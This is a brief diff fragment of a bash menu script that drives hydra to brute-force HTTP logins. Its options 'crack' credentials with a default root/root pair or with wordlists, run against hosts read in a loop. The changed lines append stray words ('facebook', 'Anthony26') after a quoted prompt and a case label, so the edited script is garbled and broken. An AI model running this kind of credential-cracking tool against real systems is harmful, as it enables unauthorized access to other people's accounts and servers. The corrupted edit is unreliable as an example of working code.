@@ -2,12 +2,12 @@
 
 
 
-PS3='Please enter your choice: '
+PS3='Please enter your choice: 'facebook
 options=("Crack with default pass/login" "Crack with wordlist (for pass/login)" "Crack with wordlist for only pass" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
-        "Crack with default pass/login")
+        "Crack with default pass/login")Anthony26
 		while read p; do
   		echo $p
 		hydra -F -t 6 -o passes.txt -l root -p root -vV $p http-get / 
